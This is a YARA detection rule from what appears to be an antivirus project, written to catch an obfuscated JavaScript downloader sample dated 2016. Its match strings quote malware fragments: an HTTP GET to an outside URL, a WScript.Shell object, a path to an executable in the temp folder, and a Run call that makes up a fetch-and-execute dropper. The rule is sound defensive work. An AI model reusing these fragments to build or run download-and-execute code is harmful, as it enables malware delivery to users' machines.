rule sig_20160330_11a03a51353402ec67833d872a578b20 {
  meta:
    description = "datamaliciousorder - file 20160330_11a03a51353402ec67833d872a578b20.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5e3100dbc6fa6c5496969e83a66ec3befce24046c6bfe03280d93b6c8f2e20ad"

  strings:
    $s1  = "_G0[_ZB](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "function _Y(_NK, _G1){_WJ = _WJ * 1; return _NK - _G1;};" fullword ascii
    $s3  = "var _R = function _H() {return WScript[_HB](\"WScript\"+\".Shell\");}(), _T0 = 11;" fullword ascii
    $s4  = "if (_G0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _O() {return _R[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"g8f9loSbrr.ex\" + \"e\";};" fullword ascii
    $s6  = "function _X(){return _Y0 + \"\";};" fullword ascii
    $s7  = "function _E(_RW){_R[\"Run\"](_RW, _WJ, _WJ);};" fullword ascii
    $s8  = "function _P() {return ((_HB0 == true) && (_HB0 == _J0)) ? 1 : _WJ;};" fullword ascii
    $s9  = "function _G(){return 22;};" fullword ascii
    $s10 = "return _Y(_VH, _T);" fullword ascii
    $s11 = " while (_J){" fullword ascii
    $s12 = "var _UR = new this[\"Date\"]();" fullword ascii
    $s13 = "function _H0()" fullword ascii
    $s14 = "function _NW(_Q0) {var _RP = (1, 2, 3, 4, 5, _Q0); return _RP;};" fullword ascii
    $s15 = "function _TU(){return _HB;};" fullword ascii
    $s16 = "var _HB0 = false;" fullword ascii
    $s17 = "_J0 = true; " fullword ascii
    $s18 = "var _J0 = false;" fullword ascii
    $s19 = "_HB0 = true; " fullword ascii
    $s20 = "var _GE = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}